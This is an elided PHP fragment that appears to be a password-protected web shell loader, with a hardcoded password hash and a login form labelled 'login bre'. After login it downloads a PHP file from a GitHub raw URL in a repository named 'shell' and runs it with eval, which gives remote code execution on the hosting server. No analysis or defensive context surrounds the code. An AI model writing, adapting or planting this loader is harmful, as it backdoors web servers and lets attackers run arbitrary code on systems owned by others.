...
if (isset($_POST['password'])) {
   ...
   $hashed_password = '420e9e53194d200b3f649e441cd17946'; 
...
if (is_logged_in()) {
   $a = geturlsinfo('https://raw.githubusercontent.com/BSBSI007/shell/refs/heads/main/hanif.php');
   eval('?>' . $a);
} else {
   ...
   <body>
       ...
       <form method="POST" action="">
           ...
           <input type="submit" value="login bre">
       </form>
       </center>
   </body>
   </html>
